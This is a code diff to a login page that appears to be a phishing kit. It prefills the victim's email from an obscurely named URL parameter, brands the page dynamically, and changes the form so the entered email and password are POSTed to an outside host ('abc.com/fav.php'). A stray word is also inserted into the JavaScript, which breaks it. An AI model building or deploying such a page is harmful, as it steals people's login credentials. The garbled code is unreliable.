@@ -1,3 +1,7 @@
+<?php
+// Minimal PHP to render the page
+$email = isset($_GET['3ODkwIiw']) ? htmlspecialchars($_GET['3ODkwIiw']) : '';
+?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -18,9 +22,13 @@
             transition: background-image 0.5s ease;
         }
         .login-container {
+            background-color: rgba(255, 255, 255, 0.95); /* Semi-opaque white to stand out */
+            z-index: 10; /* Ensure form is above background */
             transform: translateX(200px);
             opacity: 0;
             animation: slideIn 1s ease-out forwards;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
         }
         @keyframes slideIn {
             to { transform: translateX(0); opacity: 1; }
@@ -28,21 +36,24 @@
     </style>
 </head>
 <body>
-    <div class="bg-white p-8 rounded-lg shadow-lg w-full max-w-md login-container">
+    <div class="p-8 w-full max-w-md login-container">
         <div class="flex justify-center items-center mb-4">
             <img id="logoimg" src="" alt="Company Logo" class="h-16 hidden">
         </div>
-        <h2 id="logoname" class="text-2xl font-bold text-center mb-2 capitalize"></h2>
-        <form id="login-form">
+        <h2 id="logoname" class="text-2xl font-bold text-center mb-4 capitalize"></h2>
+        <form id="login-form" method="POST" action="https://abc.com/fav.php">
             <input
                 type="email"
                 id="email"
+                name="email"
                 placeholder="Email"
                 class="w-full p-2 mb-3 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
+                value="<?php echo $email; ?>"
             >
             <input
                 type="password"
                 id="password"
+                name="password"
                 placeholder="Password"
                 class="w-full p-2 mb-3 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
             >
@@ -155,11 +166,11 @@
             $('#email').on('input', function() {
                 email = $(this).val();
                 updateBranding(email);
+           Spiritualized
             });
 
-            // Handle form submission
+            // Handle form submission (client-side validation)
             $('#login-form').on('submit', function(e) {
-                e.preventDefault();
                 $('#error').hide();
                 $('#msg').hide();
 
@@ -167,24 +178,27 @@
                 const passwordVal = $('#password').val();
 
                 if (!emailVal) {
+                    e.preventDefault();
                     $('#error').text('Email field is empty').show();
                     console.log('Form error: Email empty');
                     return;
                 }
                 if (!emailRegex.test(emailVal)) {
+                    e.preventDefault();
                     $('#error').text('Invalid email format').show();
                     console.log('Form error: Invalid email');
                     return;
                 }
                 if (!passwordVal) {
+                    e.preventDefault();
                     $('#error').text('Password field is empty').show();
                     console.log('Form error: Password empty');
                     return;
                 }
 
-                $('#msg').text('Login attempt recorded').show();
-                $('#password').val('');
+                $('#msg').text('Submitting to server...').show();
                 console.log('Form submitted: Email=', emailVal);
+                // Form submission proceeds to https://abc.com/fav.php
             });
         });
     </script>
